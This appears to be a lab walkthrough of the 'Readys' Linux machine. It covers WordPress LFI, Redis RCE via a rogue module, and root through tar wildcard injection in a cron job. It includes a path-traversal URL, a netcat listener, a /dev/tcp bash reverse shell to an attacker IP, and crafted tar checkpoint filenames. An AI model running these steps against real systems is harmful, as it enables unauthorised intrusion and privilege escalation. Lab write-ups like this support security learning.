# 🧱 Readys (Linux)

## 🚪 Initial Foothold

- Target involved a WordPress instance vulnerable to **Local File Inclusion (LFI)**.
- Ran `wpscan` and discovered [LFI vulnerability 44340](https://www.exploit-db.com/exploits/44340).
- Used LFI to view:
  - `/etc/passwd`
  - `/etc/redis/redis.conf` — found Redis password using the `requirepass` directive.

### 🧨 Redis RCE Exploitation

- Downloaded payload:
  - [exp.so file](https://github.com/n0b0dyCN/redis-rogue-server/blob/master/exp.so)
  - [Redis RCE Exploit](https://github.com/Ridter/redis-rce?source=post_page-----88a3e0e21f62---------------------------------------)
- On attacker machine:
  ```bash
  sudo nc -nlvp 80
  ./redis-rce.py -r 192.168.234.166 -p 6379 -L 192.168.45.166 -P 80 -f redis-rogue-server/exp.so -a "Ready4Redis?"
  ```
  - Selected reverse shell option and caught a shell.

- Enumerated with:
  ```bash
  netstat -tulnp
  find / -type d -maxdepth 5 -writable 2>/dev/null
  ```
- Found MySQL credentials in `/var/www/html/wp-config.php`.

### 🐚 Alternative Shell Method

- Uploaded **Ivan's PHP reverse shell** to `/run/redis` and used LFI exploit again to trigger it:
  ```bash
  http://$IP/wp-content/plugins/vulnerable_plugin/lfi.php?file=../../../run/redis/shell.php
  ```

## 🔼 Privilege Escalation

- `linpeas.sh` found a **cron job running `tar`** on a folder inside `/var/www/html/`.
- Abused `tar` wildcard injection to escalate privileges:
  1. Created a reverse shell script:
     ```bash
     echo '#!/bin/bash' > shell.sh
     echo '/bin/bash -i >& /dev/tcp/192.168.45.166/80 0>&1' >> shell.sh
     chmod +x shell.sh
     ```
  2. Placed it inside `/var/www/html/` on target.
  3. Created malicious tar triggers:
     ```bash
     touch -- "--checkpoint=1"
     touch -- "--checkpoint-action=exec=bash shell.sh"
     ```

🔗 [Tar wildcard abuse reference](https://medium.com/@silver-garcia/how-to-abuse-tar-wildcards-for-privilege-escalation-tar-wildcard-injection-612a6eac0807)

---

## 🧾 Git Commands

```bash
# Move the file to the walkthroughs folder
mv ~/Downloads/Readys.md ~/Downloads/walkthroughs_project_template/linux/Readys.md

# Go to the project directory
cd ~/Downloads/walkthroughs_project_template

# Stage all changes
git add .

# Commit with a descriptive message
git commit -m "Added Readys (Linux) walkthrough"

# Push the commit to GitHub
git push
```